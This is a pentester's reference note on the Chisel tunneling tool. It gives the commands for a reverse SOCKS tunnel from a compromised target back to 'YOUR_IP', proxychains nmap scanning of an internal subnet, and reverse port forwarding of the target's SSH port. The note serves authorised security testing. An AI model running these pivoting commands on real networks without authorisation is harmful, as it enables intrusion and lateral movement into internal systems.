---
tags: [tool, pivoting]
tool: chisel
category: Pivoting
installed: true
---

# Chisel - Fast Tunneling

## Overview
Fast TCP/UDP tunneling over HTTP with SOCKS5 proxy

## Location
/usr/bin/chisel (Linux)
~/tools/pivoting/windows/chisel.exe (Windows)

## Usage

### On Kali (Server)
chisel server -p 8000 --reverse

### On Target (Client)
./chisel client YOUR_IP:8000 R:socks

### Use with proxychains
proxychains4 nmap -sT -Pn 10.10.10.0/24

### Port Forwarding
chisel client YOUR_IP:8000 8080:internal:80
chisel client YOUR_IP:8000 R:4444:localhost:22
